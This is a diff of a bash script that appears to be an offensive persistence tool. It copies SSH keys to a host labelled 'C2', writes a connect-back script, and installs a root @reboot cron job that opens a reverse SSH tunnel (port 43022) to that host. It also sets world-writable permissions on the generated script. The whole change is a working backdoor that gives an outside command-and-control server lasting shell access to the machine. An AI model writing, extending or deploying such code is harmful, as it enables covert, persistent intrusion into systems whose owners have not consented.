@@ -41,14 +41,14 @@ fi
 
 
 # Set flags.
-while getopts "a:k:c:u:l:h" FLAG
+while getopts "ahk:c:u:l:" FLAG
 do
 	case $FLAG in
 		a)
 			AWS=1
 			;;
 		k)
-			KEY=$OPTARG
+			KEY="$OPTARG"
 			;;
 		c)
 			HOST=$OPTARG
@@ -130,14 +130,37 @@ done
 
 if [ ${AWS} -eq 1 ]; then
 
-#    ssh -i ${KEY} ${USERC2}@${HOST}
+
 # Transferring local key to C2
     echo "${bold}### Copying key to C2 host ###"
     echo "${USERLOCAL}, ${KEY}, ${USERC2}, ${HOST}"
     scp -i ${KEY} /home/${USERLOCAL}/.ssh/id_rsa.pub ${USERC2}@${HOST}:/home/${USERC2}/.ssh/
     printf "\n"
-    echo "I got here."
+
+
+# Generating an ssh key on your C2
+    ssh $HOST 'ssh-keygen'
+
+
+# Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches$
+    echo "${bold}### Creating & transferring remote connection script ###"
+    echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERLOCAL/hm$
+    sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh
+    scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
+    printf "\n"
+
+
+# Setup local cron job + cleanup
+    echo "${bold}### Setting up local cronjob ###"
+    echo "@reboot sleep 100 && sudo ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
+    sudo crontab cronsh
+    rm cronsh
+    printf "\n"
+
+# Finishing script
+    echo "${bold}### Donezo! Please reboot the machine. ###"
     exit
+
 else
 # Transferring local key to C2
     echo "${bold}### Copying key to C2 host ###"
@@ -164,7 +187,6 @@ else
     sudo crontab cronsh
     rm cronsh
     printf "\n"
-
     exit
 fi
 
